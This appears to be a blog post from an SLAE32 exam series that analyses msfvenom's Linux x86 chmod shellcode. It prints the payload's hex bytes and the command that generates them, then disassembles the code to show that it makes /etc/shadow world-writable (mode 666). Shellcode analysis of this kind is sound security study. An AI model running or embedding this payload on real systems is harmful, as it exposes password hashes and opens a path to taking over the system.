## Introduction
If we search on internet we will find a lot of ready to use shellcodes of various types, somes are for simple command execution, others adds "secret users" in victim machine, others are bind and reverse shell like the shellcodes wrote in this blog. The question is, shall we trust shellcodes found in internet? Following the general rule "Trust no one" the answer should be a big No, but sometime, for example when we have limited time, we prefer or we are forced to use others shellcode.<br>
In this cases what we suggest is to analyze the downloaed shellcode in sandbox machine before use it, to ensure that it will do what it declare.<br>
For this post we want to show how to analyze 3 samples of shellcodes took from msfvenom payload tool.
We can use the msfvenom tool to list payloads that could be produced:
```bash
root@slae32-lab:# msfvenom -l payloads |grep linux/x86
```

We have already build (and analyzed) the bind and reverse shellcode types so we choosed this 3 shellcode samples:
- [linux/x86/adduser](https://blackcloud.me/SLAE32-5-1/) "Create a new user with UID 0"
- linux/x86/chmod "Runs chmod on specified file with specified mode"
- [linux/x86/exec](https://blackcloud.me/SLAE32-5-3/) "Execute an arbitrary command"

So let's start our analysis

## Chmod
First thing, we must create the payload with msfvenom
```bash
root@slae32-lab:# msfvenom -p linux/x86/chmod -f C -a x86 --platform linux
No encoder or badchars specified, outputting raw payload
Payload size: 36 bytes
Final size of c file: 177 bytes
unsigned char buf[] = 
"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
"\x80\x6a\x01\x58\xcd\x80";
```
Now we need to analyze it with ndisasm, using the command 
```bash
echo -ne "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u -
```
As we can see, the strcture of the payload is like the ```adduser```. In this case we have only one syscall ```chmod()```.<br>

First of all, it loads the 0xf (15 in decimal) in the EAX register, 15 means chmod syscall, next ```call dword 0x16``` jump forward of 16 bytes to ```pop ebx``` that load in EBX the stack containing the pathname of the file that need permission changes, the pathname is saved in the stack and is contained in this range of code
```
0000000A  2F                das
0000000B  657463            gs jz 0x71
0000000E  2F                das
0000000F  7368              jnc 0x79
00000011  61                popad
00000012  646F              fs outsd
00000014  7700              ja 0x16
```
Copy the hex values
```
2F
657463
2F
7368
61
646F
77
```
and convert it<br>

Next thing is to set the octal that will define the permission to set to the pathname and store it in ECX, in this case the value is 0x1b6, in octal ```666```, last exit with code 1.<br>
```bash
# printf "%o\n" 0x1b6
666
```
```
00000017  68B6010000        push dword 0x1b6
0000001C  59                pop ecx
0000001D  CD80              int 0x80
0000001F  6A01              push byte +0x1
00000021  58                pop eax
00000022  CD80              int 0x80
```
### Check the results
Let's try the payload and watch the execution

It worked!.<br>
